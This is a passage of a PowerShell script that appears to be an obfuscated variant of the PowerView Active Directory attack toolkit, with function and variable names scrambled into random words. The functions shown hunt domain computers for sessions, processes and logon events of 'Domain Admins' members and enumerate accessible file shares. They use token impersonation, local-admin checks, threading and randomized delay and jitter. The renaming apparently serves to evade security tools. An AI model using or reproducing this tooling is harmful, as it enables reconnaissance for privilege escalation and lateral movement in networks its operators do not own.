                                $jjPRFsPD99 | Add-Member Noteproperty 'UserDomain' $Null
                                $jjPRFsPD99 | Add-Member Noteproperty 'UserName' $TEQSWNGN99
                                $jjPRFsPD99 | Add-Member Noteproperty 'ComputerName' $kqQkzLHh99
                                $jjPRFsPD99 | Add-Member Noteproperty 'SessionFrom' $CName
                                try {
                                    $isOFLXxF99 = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName
                                    $jjPRFsPD99 | Add-Member NoteProperty 'SessionFromName' $isOFLXxF99
                                }
                                catch {
                                    $jjPRFsPD99 | Add-Member NoteProperty 'SessionFromName' $Null
                                }
                                if ($NEqdIfsc99) {
                                    $Admin = (neoclassicism -iEYVPYCX99 $CName).IsAdmin
                                    $jjPRFsPD99 | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                }
                                else {
                                    $jjPRFsPD99 | Add-Member Noteproperty 'LocalAdmin' $Null
                                }
                                $jjPRFsPD99.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                $jjPRFsPD99
                            }
                        }
                    }
                    if (-not $OIjSaWab99) {
                        $ZOXwnwPJ99 = sapped -iEYVPYCX99 $kqQkzLHh99
                        ForEach ($User in $ZOXwnwPJ99) {
                            $TEQSWNGN99 = $User.UserName
                            $wvZHbMee99 = $User.LogonDomain
                            if (($TEQSWNGN99) -and ($TEQSWNGN99.trim() -ne '')) {
                                if ( (-not $xYlValoQ99) -or ($xYlValoQ99 -contains $TEQSWNGN99) -and ($TEQSWNGN99 -notmatch '\$$')) {
                                    $QSFCdieB99 = @(readjust -iEYVPYCX99 $kqQkzLHh99)[0].IPAddress
                                    $jjPRFsPD99 = New-Object PSObject
                                    $jjPRFsPD99 | Add-Member Noteproperty 'UserDomain' $wvZHbMee99
                                    $jjPRFsPD99 | Add-Member Noteproperty 'UserName' $TEQSWNGN99
                                    $jjPRFsPD99 | Add-Member Noteproperty 'ComputerName' $kqQkzLHh99
                                    $jjPRFsPD99 | Add-Member Noteproperty 'IPAddress' $QSFCdieB99
                                    $jjPRFsPD99 | Add-Member Noteproperty 'SessionFrom' $Null
                                    $jjPRFsPD99 | Add-Member Noteproperty 'SessionFromName' $Null
                                    if ($NEqdIfsc99) {
                                        $Admin = neoclassicism -iEYVPYCX99 $kqQkzLHh99
                                        $jjPRFsPD99 | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                    }
                                    else {
                                        $jjPRFsPD99 | Add-Member Noteproperty 'LocalAdmin' $Null
                                    }
                                    $jjPRFsPD99.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                    $jjPRFsPD99
                                }
                            }
                        }
                    }
                }
            }
            if ($sdyalGJn99) {
                mucilage
            }
        }
        $THMRkorV99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $THMRkorV99 = pant -QWHERWHL99 $QWHERWHL99
            }
            else {
                $THMRkorV99 = pant -QWHERWHL99 $QWHERWHL99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[noxious] Total number of hosts: $($gzPujpsa99.count)"
            Write-Verbose "[noxious] Delay: $Delay, Jitter: $uQeLHAls99"
            $jsfDIrRy99 = 0
            $uRxBaWtW99 = New-Object System.Random
            ForEach ($kqQkzLHh99 in $gzPujpsa99) {
                $jsfDIrRy99 = $jsfDIrRy99 + 1
                Start-Sleep -Seconds $uRxBaWtW99.Next((1-$uQeLHAls99)*$Delay, (1+$uQeLHAls99)*$Delay)
                Write-Verbose "[noxious] Enumerating server $UEyZXQpH99 ($jsfDIrRy99 of $($gzPujpsa99.Count))"
                Invoke-Command -WwGMfZTW99 $avGNuFUJ99 -ArgumentList $kqQkzLHh99, $xYlValoQ99, $bDAylcSa99, $OIjSaWab99, $THMRkorV99
                if ($yBCCHOLl99 -and $PmmsrNDG99) {
                    Write-Verbose "[noxious] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[noxious] Using threading with threads: $InJWRogf99"
            Write-Verbose "[noxious] TargetComputers length: $($gzPujpsa99.Length)"
            $MceEbqjr99 = @{
                'TargetUsers' = $xYlValoQ99
                'CurrentUser' = $bDAylcSa99
                'Stealth' = $OIjSaWab99
                'TokenHandle' = $THMRkorV99
            }
            recuperate -iEYVPYCX99 $gzPujpsa99 -WwGMfZTW99 $avGNuFUJ99 -hJnTvHxu99 $MceEbqjr99 -InJWRogf99 $InJWRogf99
        }
    }
    END {
        if ($THMRkorV99) {
            mucilage -sdyalGJn99 $THMRkorV99
        }
    }
}
function gelds {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $iEYVPYCX99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [String]
        $WrQcWRYD99,
        [ValidateNotNullOrEmpty()]
        [String]
        $PcddQtAy99,
        [ValidateNotNullOrEmpty()]
        [String]
        $cpoQzrSk99,
        [Alias('Unconstrained')]
        [Switch]
        $XcKoPUUD99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $gosnxdoy99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $qlsvvtLC99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $oyguzKXd99,
        [Parameter(ParameterSetName = 'TargetProcess')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $eqblopqJ99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $xcenmayP99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $wvZHbMee99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UIdYQyoC99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $IhePRRvG99,
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $yZnISgIj99 = 'Domain Admins',
        [Parameter(ParameterSetName = 'TargetUser')]
        [Alias('AdminCount')]
        [Switch]
        $hFUNKKKC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $PmmsrNDG99,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $uQeLHAls99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $InJWRogf99 = 20
    )
    BEGIN {
        $wyZNUiid99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $wyZNUiid99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['ComputerDomain']) { $wyZNUiid99['Domain'] = $WrQcWRYD99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $wyZNUiid99['LDAPFilter'] = $PcddQtAy99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $wyZNUiid99['SearchBase'] = $cpoQzrSk99 }
        if ($PSBoundParameters['Unconstrained']) { $wyZNUiid99['Unconstrained'] = $vDbTHhCu99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $wyZNUiid99['OperatingSystem'] = $blbEZMhK99 }
        if ($PSBoundParameters['ComputerServicePack']) { $wyZNUiid99['ServicePack'] = $sXOuralh99 }
        if ($PSBoundParameters['ComputerSiteName']) { $wyZNUiid99['SiteName'] = $cgKWGcFU99 }
        if ($PSBoundParameters['Server']) { $wyZNUiid99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $wyZNUiid99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $wyZNUiid99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $wyZNUiid99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $wyZNUiid99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $wyZNUiid99['Credential'] = $QWHERWHL99 }
        $vtcZsFqI99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $vtcZsFqI99['Identity'] = $xcenmayP99 }
        if ($PSBoundParameters['Domain']) { $vtcZsFqI99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['UserDomain']) { $vtcZsFqI99['Domain'] = $wvZHbMee99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $vtcZsFqI99['LDAPFilter'] = $UIdYQyoC99 }
        if ($PSBoundParameters['UserSearchBase']) { $vtcZsFqI99['SearchBase'] = $IhePRRvG99 }
        if ($PSBoundParameters['UserAdminCount']) { $vtcZsFqI99['AdminCount'] = $hFUNKKKC99 }
        if ($PSBoundParameters['Server']) { $vtcZsFqI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $vtcZsFqI99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $vtcZsFqI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $vtcZsFqI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $vtcZsFqI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $vtcZsFqI99['Credential'] = $QWHERWHL99 }
        if ($PSBoundParameters['ComputerName']) {
            $gzPujpsa99 = $iEYVPYCX99
        }
        else {
            Write-Verbose '[gelds] Querying computers in the domain'
            $gzPujpsa99 = beefsteaks @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[gelds] TargetComputers length: $($gzPujpsa99.Length)"
        if ($gzPujpsa99.Length -eq 0) {
            throw '[gelds] No hosts found to enumerate'
        }
        if ($PSBoundParameters['ProcessName']) {
            $MJfexmKN99 = @()
            ForEach ($T in $eqblopqJ99) {
                $MJfexmKN99 += $T.Split(',')
            }
            if ($MJfexmKN99 -isnot [System.Array]) {
                $MJfexmKN99 = [String[]] @($MJfexmKN99)
            }
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $xYlValoQ99 = melodrama @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $wPpyiOTM99 = @{
                'Identity' = $yZnISgIj99
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $wPpyiOTM99['Domain'] = $wvZHbMee99 }
            if ($PSBoundParameters['UserSearchBase']) { $wPpyiOTM99['SearchBase'] = $IhePRRvG99 }
            if ($PSBoundParameters['Server']) { $wPpyiOTM99['Server'] = $vbyFupaI99 }
            if ($PSBoundParameters['SearchScope']) { $wPpyiOTM99['SearchScope'] = $RVZhWaEH99 }
            if ($PSBoundParameters['ResultPageSize']) { $wPpyiOTM99['ResultPageSize'] = $rguZwVJP99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $wPpyiOTM99['ServerTimeLimit'] = $CRJCwXfg99 }
            if ($PSBoundParameters['Tombstone']) { $wPpyiOTM99['Tombstone'] = $iqiYBoee99 }
            if ($PSBoundParameters['Credential']) { $wPpyiOTM99['Credential'] = $QWHERWHL99 }
            $wPpyiOTM99
            $xYlValoQ99 = plowed @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }
        $avGNuFUJ99 = {
            Param($iEYVPYCX99, $eqblopqJ99, $xYlValoQ99, $QWHERWHL99)
            ForEach ($kqQkzLHh99 in $iEYVPYCX99) {
                $Up = Test-Connection -Count 1 -Quiet -iEYVPYCX99 $kqQkzLHh99
                if ($Up) {
                    if ($QWHERWHL99) {
                        $BgkwnxSZ99 = ratcheting -QWHERWHL99 $QWHERWHL99 -iEYVPYCX99 $kqQkzLHh99 -ErrorAction SilentlyContinue
                    }
                    else {
                        $BgkwnxSZ99 = ratcheting -iEYVPYCX99 $kqQkzLHh99 -ErrorAction SilentlyContinue
                    }
                    ForEach ($lFoSVtQU99 in $BgkwnxSZ99) {
                        if ($eqblopqJ99) {
                            if ($eqblopqJ99 -Contains $lFoSVtQU99.ProcessName) {
                                $lFoSVtQU99
                            }
                        }
                        elseif ($xYlValoQ99 -Contains $lFoSVtQU99.User) {
                            $lFoSVtQU99
                        }
                    }
                }
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[gelds] Total number of hosts: $($gzPujpsa99.count)"
            Write-Verbose "[gelds] Delay: $Delay, Jitter: $uQeLHAls99"
            $jsfDIrRy99 = 0
            $uRxBaWtW99 = New-Object System.Random
            ForEach ($kqQkzLHh99 in $gzPujpsa99) {
                $jsfDIrRy99 = $jsfDIrRy99 + 1
                Start-Sleep -Seconds $uRxBaWtW99.Next((1-$uQeLHAls99)*$Delay, (1+$uQeLHAls99)*$Delay)
                Write-Verbose "[gelds] Enumerating server $kqQkzLHh99 ($jsfDIrRy99 of $($gzPujpsa99.count))"
                $yBCCHOLl99 = Invoke-Command -WwGMfZTW99 $avGNuFUJ99 -ArgumentList $kqQkzLHh99, $MJfexmKN99, $xYlValoQ99, $QWHERWHL99
                $yBCCHOLl99
                if ($yBCCHOLl99 -and $PmmsrNDG99) {
                    Write-Verbose "[gelds] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[gelds] Using threading with threads: $InJWRogf99"
            $MceEbqjr99 = @{
                'ProcessName' = $MJfexmKN99
                'TargetUsers' = $xYlValoQ99
                'Credential' = $QWHERWHL99
            }
            recuperate -iEYVPYCX99 $gzPujpsa99 -WwGMfZTW99 $avGNuFUJ99 -hJnTvHxu99 $MceEbqjr99 -InJWRogf99 $InJWRogf99
        }
    }
}
function postponed {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $iEYVPYCX99,
        [Parameter(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $iNUvqNTo99,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $qdTaDskZ99 = [DateTime]::Now.AddDays(-1),
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $feOfVFSp99 = [DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
        $AVWFCNgx99 = 5000,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $xcenmayP99,
        [ValidateNotNullOrEmpty()]
        [String]
        $wvZHbMee99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UIdYQyoC99,
        [ValidateNotNullOrEmpty()]
        [String]
        $IhePRRvG99,
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $yZnISgIj99 = 'Domain Admins',
        [Alias('AdminCount')]
        [Switch]
        $hFUNKKKC99,
        [Switch]
        $NEqdIfsc99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $PmmsrNDG99,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $uQeLHAls99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $InJWRogf99 = 20
    )
    BEGIN {
        $vtcZsFqI99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $vtcZsFqI99['Identity'] = $xcenmayP99 }
        if ($PSBoundParameters['UserDomain']) { $vtcZsFqI99['Domain'] = $wvZHbMee99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $vtcZsFqI99['LDAPFilter'] = $UIdYQyoC99 }
        if ($PSBoundParameters['UserSearchBase']) { $vtcZsFqI99['SearchBase'] = $IhePRRvG99 }
        if ($PSBoundParameters['UserAdminCount']) { $vtcZsFqI99['AdminCount'] = $hFUNKKKC99 }
        if ($PSBoundParameters['Server']) { $vtcZsFqI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $vtcZsFqI99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $vtcZsFqI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $vtcZsFqI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $vtcZsFqI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $vtcZsFqI99['Credential'] = $QWHERWHL99 }
        if ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount']) {
            $xYlValoQ99 = melodrama @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        elseif ($PSBoundParameters['UserGroupIdentity'] -or (-not $PSBoundParameters['Filter'])) {
            $wPpyiOTM99 = @{
                'Identity' = $yZnISgIj99
                'Recurse' = $True
            }
            Write-Verbose "UserGroupIdentity: $yZnISgIj99"
            if ($PSBoundParameters['UserDomain']) { $wPpyiOTM99['Domain'] = $wvZHbMee99 }
            if ($PSBoundParameters['UserSearchBase']) { $wPpyiOTM99['SearchBase'] = $IhePRRvG99 }
            if ($PSBoundParameters['Server']) { $wPpyiOTM99['Server'] = $vbyFupaI99 }
            if ($PSBoundParameters['SearchScope']) { $wPpyiOTM99['SearchScope'] = $RVZhWaEH99 }
            if ($PSBoundParameters['ResultPageSize']) { $wPpyiOTM99['ResultPageSize'] = $rguZwVJP99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $wPpyiOTM99['ServerTimeLimit'] = $CRJCwXfg99 }
            if ($PSBoundParameters['Tombstone']) { $wPpyiOTM99['Tombstone'] = $iqiYBoee99 }
            if ($PSBoundParameters['Credential']) { $wPpyiOTM99['Credential'] = $QWHERWHL99 }
            $xYlValoQ99 = plowed @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }
        if ($PSBoundParameters['ComputerName']) {
            $gzPujpsa99 = $iEYVPYCX99
        }
        else {
            $hJqdOzKQ99 = @{
                'LDAP' = $True
            }
            if ($PSBoundParameters['Domain']) { $hJqdOzKQ99['Domain'] = $CmuysoGL99 }
            if ($PSBoundParameters['Server']) { $hJqdOzKQ99['Server'] = $vbyFupaI99 }
            if ($PSBoundParameters['Credential']) { $hJqdOzKQ99['Credential'] = $QWHERWHL99 }
            Write-Verbose "[postponed] Querying for domain controllers in domain: $CmuysoGL99"
            $gzPujpsa99 = Marsala @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        if ($gzPujpsa99 -and ($gzPujpsa99 -isnot [System.Array])) {
            $gzPujpsa99 = @(,$gzPujpsa99)
        }
        Write-Verbose "[postponed] TargetComputers length: $($gzPujpsa99.Length)"
        Write-Verbose "[postponed] TargetComputers $gzPujpsa99"
        if ($gzPujpsa99.Length -eq 0) {
            throw '[postponed] No hosts found to enumerate'
        }
        $avGNuFUJ99 = {
            Param($iEYVPYCX99, $qdTaDskZ99, $feOfVFSp99, $AVWFCNgx99, $xYlValoQ99, $iNUvqNTo99, $QWHERWHL99)
            ForEach ($kqQkzLHh99 in $iEYVPYCX99) {
                $Up = Test-Connection -Count 1 -Quiet -iEYVPYCX99 $kqQkzLHh99
                if ($Up) {
                    $XpYliraN99 = @{
                        'ComputerName' = $kqQkzLHh99
                    }
                    if ($qdTaDskZ99) { $XpYliraN99['StartTime'] = $qdTaDskZ99 }
                    if ($feOfVFSp99) { $XpYliraN99['EndTime'] = $feOfVFSp99 }
                    if ($AVWFCNgx99) { $XpYliraN99['MaxEvents'] = $AVWFCNgx99 }
                    if ($QWHERWHL99) { $XpYliraN99['Credential'] = $QWHERWHL99 }
                    if ($iNUvqNTo99 -or $xYlValoQ99) {
                        if ($xYlValoQ99) {
                            bungler @DomainUserEventArgs | Where-Object {$xYlValoQ99 -contains $_.TargetUserName}
                        }
                        else {
                            $yBaVitad99 = 'or'
                            $iNUvqNTo99.Keys | ForEach-Object {
                                if (($_ -eq 'Op') -or ($_ -eq 'Operator') -or ($_ -eq 'Operation')) {
                                    if (($iNUvqNTo99[$_] -match '&') -or ($iNUvqNTo99[$_] -eq 'and')) {
                                        $yBaVitad99 = 'and'
                                    }
                                }
                            }
                            $Keys = $iNUvqNTo99.Keys | Where-Object {($_ -ne 'Op') -and ($_ -ne 'Operator') -and ($_ -ne 'Operation')}
                            bungler @DomainUserEventArgs | ForEach-Object {
                                if ($yBaVitad99 -eq 'or') {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -match $iNUvqNTo99[$Key]) {
                                            $_
                                        }
                                    }
                                }
                                else {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -notmatch $iNUvqNTo99[$Key]) {
                                            break
                                        }
                                        $_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        bungler @DomainUserEventArgs
                    }
                }
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[postponed] Total number of hosts: $($gzPujpsa99.count)"
            Write-Verbose "[postponed] Delay: $Delay, Jitter: $uQeLHAls99"
            $jsfDIrRy99 = 0
            $uRxBaWtW99 = New-Object System.Random
            ForEach ($kqQkzLHh99 in $gzPujpsa99) {
                $jsfDIrRy99 = $jsfDIrRy99 + 1
                Start-Sleep -Seconds $uRxBaWtW99.Next((1-$uQeLHAls99)*$Delay, (1+$uQeLHAls99)*$Delay)
                Write-Verbose "[postponed] Enumerating server $kqQkzLHh99 ($jsfDIrRy99 of $($gzPujpsa99.count))"
                $yBCCHOLl99 = Invoke-Command -WwGMfZTW99 $avGNuFUJ99 -ArgumentList $kqQkzLHh99, $qdTaDskZ99, $feOfVFSp99, $AVWFCNgx99, $xYlValoQ99, $iNUvqNTo99, $QWHERWHL99
                $yBCCHOLl99
                if ($yBCCHOLl99 -and $PmmsrNDG99) {
                    Write-Verbose "[postponed] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[postponed] Using threading with threads: $InJWRogf99"
            $MceEbqjr99 = @{
                'StartTime' = $qdTaDskZ99
                'EndTime' = $feOfVFSp99
                'MaxEvents' = $AVWFCNgx99
                'TargetUsers' = $xYlValoQ99
                'Filter' = $iNUvqNTo99
                'Credential' = $QWHERWHL99
            }
            recuperate -iEYVPYCX99 $gzPujpsa99 -WwGMfZTW99 $avGNuFUJ99 -hJnTvHxu99 $MceEbqjr99 -InJWRogf99 $InJWRogf99
        }
    }
}
function irrelevancy {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $iEYVPYCX99,
        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        $WrQcWRYD99,
        [ValidateNotNullOrEmpty()]
        [String]
        $PcddQtAy99,
        [ValidateNotNullOrEmpty()]
        [String]
        $cpoQzrSk99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $gosnxdoy99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $qlsvvtLC99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $oyguzKXd99,
        [Alias('CheckAccess')]
        [Switch]
        $xJBUPAKE99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $uQeLHAls99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $InJWRogf99 = 20
    )
    BEGIN {
        $wyZNUiid99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $wyZNUiid99['Domain'] = $WrQcWRYD99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $wyZNUiid99['LDAPFilter'] = $PcddQtAy99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $wyZNUiid99['SearchBase'] = $cpoQzrSk99 }
        if ($PSBoundParameters['Unconstrained']) { $wyZNUiid99['Unconstrained'] = $vDbTHhCu99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $wyZNUiid99['OperatingSystem'] = $blbEZMhK99 }
        if ($PSBoundParameters['ComputerServicePack']) { $wyZNUiid99['ServicePack'] = $sXOuralh99 }
        if ($PSBoundParameters['ComputerSiteName']) { $wyZNUiid99['SiteName'] = $cgKWGcFU99 }
        if ($PSBoundParameters['Server']) { $wyZNUiid99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $wyZNUiid99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $wyZNUiid99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $wyZNUiid99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $wyZNUiid99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $wyZNUiid99['Credential'] = $QWHERWHL99 }
        if ($PSBoundParameters['ComputerName']) {
            $gzPujpsa99 = $iEYVPYCX99
        }
        else {
            Write-Verbose '[irrelevancy] Querying computers in the domain'
            $gzPujpsa99 = beefsteaks @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[irrelevancy] TargetComputers length: $($gzPujpsa99.Length)"
        if ($gzPujpsa99.Length -eq 0) {
            throw '[irrelevancy] No hosts found to enumerate'
        }
        $avGNuFUJ99 = {
            Param($iEYVPYCX99, $xJBUPAKE99, $sdyalGJn99)
            if ($sdyalGJn99) {
                $Null = pant -sdyalGJn99 $sdyalGJn99 -Quiet
            }
            ForEach ($kqQkzLHh99 in $iEYVPYCX99) {
                $Up = Test-Connection -Count 1 -Quiet -iEYVPYCX99 $kqQkzLHh99
                if ($Up) {
                    $fEaPpKQr99 = obligation -iEYVPYCX99 $kqQkzLHh99
                    ForEach ($Share in $fEaPpKQr99) {
                        $UigfMgOQ99 = $Share.Name
                        $Path = '\\'+$kqQkzLHh99+'\'+$UigfMgOQ99
                        if (($UigfMgOQ99) -and ($UigfMgOQ99.trim() -ne '')) {
                            if ($xJBUPAKE99) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $Share
                                }
                                catch {
                                    Write-Verbose "Error accessing share path $Path : $_"
                                }
                            }
                            else {
                                $Share
                            }
                        }
                    }
                }
            }
            if ($sdyalGJn99) {
                mucilage
            }
        }
        $THMRkorV99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
